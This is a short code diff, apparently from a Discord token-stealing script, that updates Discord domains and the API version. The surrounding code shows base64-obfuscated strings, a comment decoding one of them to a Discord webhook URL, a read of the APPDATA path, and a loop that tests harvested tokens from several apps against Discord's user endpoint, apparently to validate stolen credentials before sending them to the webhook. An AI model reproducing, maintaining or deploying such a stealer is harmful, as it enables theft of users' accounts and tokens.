@@ -14,7 +14,7 @@ a = [True, False, 'Ng==', 'VmpGYVYySXhWWGROVldoVllUSjRWbFpyV25kVWJIQlhWVzVPYWxad
 # False
 # False
 # 9 = OQ==
-# https://discordapp.com/api/webhooks/688467486307647546/eao2eTD8Uuy5BqDFcRv6zQylB2Kt2uyy4AoK17b_Bnt6U2Xtm5q60eQBfzPHQpVRWstL = The second long string
+# https://discord.com/api/webhooks/688467486307647546/eao2eTD8Uuy5BqDFcRv6zQylB2Kt2uyy4AoK17b_Bnt6U2Xtm5q60eQBfzPHQpVRWstL = The second long string
 # d4faa66c-bd90-4459-ba52-27b51f3c8201 = d4faa66c-bd90-4459-ba52-27b51f3c8201 
 
 path = os.getenv('APPDATA')
@@ -316,7 +316,7 @@ else:
 for app in list(grabbed):
     for token in grabbed[app]:
         headers = {'Authorization': token, 'Content-Type': 'application/json'}
-        src = get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
+        src = get('https://canary.discord.com/api/v7/users/@me', headers=headers)
         if src.status_code == 401:
             pass
         else:
